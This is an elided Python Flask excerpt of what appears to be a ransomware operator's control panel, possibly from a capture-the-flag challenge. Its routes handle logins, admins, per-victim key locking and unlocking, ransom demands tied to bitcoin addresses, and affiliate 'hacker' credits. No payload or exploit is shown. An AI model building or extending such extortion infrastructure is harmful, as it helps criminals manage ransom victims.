    ...
    if request.method == "POST":
        ...
        if cookie is None:
            ...
            return render_template(
                "login.html", message="Invalid login, please try again."
            )
...
def adminlist():
    ...
    with util.userdb() as con:
        adminlist = [
            row[0]
            for row in con.execute("SELECT userName FROM Accounts WHERE isAdmin = 1")
        ]
...
def lock():
    if request.args.get("demand") == None:
        ...
        with open("/opt/ransommethis/log/keygeneration.log", "a") as logfile:
            print(
                f"{datetime.now().replace(tzinfo=None, microsecond=0).isoformat()}\t{util.get_username()}\t{cid}\t{request.args.get('demand')}",
                file=logfile,
            )
...
def unlock():
    if request.args.get("receipt") == None:
        ...
        result = subprocess.run(
            ["/opt/keyMaster/keyMaster", "unlock", request.args.get("receipt")],
            capture_output=True,
            check=True,
            text=True,
            cwd="/opt/keyMaster/",
...
def credit():
    ...
    if request.method == "GET":
        ...
        args = request.form
    if (
        args.get("receipt") == None
        or args.get("hackername") == None
        or args.get("credits") == None
    ):
...
def demand():
    ...
    with util.victimdb() as con:
        row = con.execute(
            "SELECT dueDate, Baddress, pAmount FROM Victims WHERE cid = ?",
